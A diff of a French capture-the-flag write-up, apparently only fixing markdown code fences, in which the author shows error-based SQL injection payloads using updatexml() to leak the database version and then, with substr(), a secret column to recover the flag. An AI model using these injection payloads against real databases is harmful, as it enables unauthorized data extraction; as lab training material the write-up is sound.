@@ -50,7 +50,7 @@ J'essaye plein de payload ça ne marche pas, je tombe sur une doc magique de exp
 ![](https://i.imgur.com/9TOZY50.png)
 
 je test avec le payload suivant
-```sql=
+```sql
 or updatexml(1,concat(0x7e,(version())),0) or
 ```
 ![](https://i.imgur.com/rVpsXZ6.png)
@@ -72,7 +72,7 @@ Je rajoute un substr() pour avoir la fin du flag
 ![](https://i.imgur.com/ZkwvRWh.png)
 
 Payload
-```sql=
+```sql
 or updatexml(1,concat(0x7e,(SELECT SUBSTR(VerySecretThing, 20, 50) FROM image limit 0,1)),0) or 
-
+```
 Voilà flag 🙂
